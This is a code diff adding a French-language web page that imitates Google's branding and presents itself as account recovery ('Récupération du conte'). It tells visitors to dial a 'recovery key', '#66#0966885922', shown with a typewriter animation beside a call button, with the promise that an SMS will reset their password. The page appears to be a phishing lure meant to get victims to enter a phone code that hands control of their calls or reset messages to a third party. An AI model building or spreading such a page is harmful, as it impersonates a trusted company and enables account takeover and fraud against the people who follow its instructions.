@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Style Page</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; padding: 20px;
+        }
+        .google-container { max-width: 600px; width: 100%; }
+        .white-square {
+            background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px; text-align: center;
+        }
+        .logo { width: 100px; height: auto; margin-bottom: 20px; }
+        .title { font-size: 28px; color: #4285f4; margin-bottom: 15px; font-weight: 400; }
+        .call-button {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 60px; height: 60px; background: #34a853; border: none; border-radius: 50%;
+            color: white; font-size: 24px; cursor: pointer; margin: 20px auto;
+            box-shadow: 0 4px 12px rgba(52,168,83,0.4); transition: all 0.3s ease;
+            animation: pulse-blue 2s infinite;
+        }
+        .call-button:hover { background: #2d9a44; transform: scale(1.05); }
+        @keyframes pulse-blue {
+            0% { box-shadow: 0 0 0 0 rgba(66,133,244,0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(66,133,244,0); }
+            100% { box-shadow: 0 0 0 0 rgba(66,133,244,0); }
+        }
+        .text { color: #5f6368; font-size: 16px; line-height: 1.5; margin-bottom: 25px; }
+        .numbers-zone { background: #f1f3f4; border-radius: 8px; padding: 20px; margin-top: 20px; }
+        .numbers-zone h3 { color: #202124; margin-bottom: 10px; font-size: 18px; }
+
+        /* TYPEWRITER FIXÉ */
+        .numbers {
+            font-size: 24px; font-weight: bold; color: #4285f4;
+            display: inline-block; text-align: left;
+            overflow: hidden; white-space: nowrap; border-right: 3px solid #4285f4;
+            width: 0; /* animée dynamiquement */
+            animation: blink-cursor 0.75s infinite step-end;
+        }
+        @keyframes blink-cursor {
+            0%, 50% { border-color: #4285f4; }
+            51%, 100% { border-color: transparent; }
+        }
+    </style>
+</head>
+<body>
+    <div class="google-container">
+        <div class="white-square">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+            <h1 class="title">Récupération du conte</h1>
+            
+            <p class="text">Entrez la clé de récupération sur votre mobile, cliquez sur "Appeler", sélectionnez votre SIM. Un SMS vous permettra de réinitialiser votre mot de passe.</p>
+            <div class="numbers-zone">
+                <h3>Clé de récupération</h3>
+                <div class="numbers">#66#0966885922</div>
+            </div>
+            <button class="call-button" title="Appeler"><i class="fas fa-phone"></i></button>
+        </div>
+    </div>
+
+    <script>
+        const numbers = document.querySelector('.numbers');
+
+        function restart() {
+            const fullWidth = numbers.scrollWidth + 'px'; // largeur exacte du texte
+            numbers.style.width = '0';
+            numbers.style.transition = 'none';
+            numbers.offsetHeight; // reflow
+
+            // animation fluide sans décalage
+            requestAnimationFrame(() => {
+                numbers.style.transition = 'width 2.5s steps(' + numbers.textContent.length + ', end)';
+                numbers.style.width = fullWidth;
+            });
+        }
+
+        setTimeout(restart, 100);
+
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) restart();
+        });
+        window.addEventListener('focus', restart);
+    </script>
+</body>
+</html>
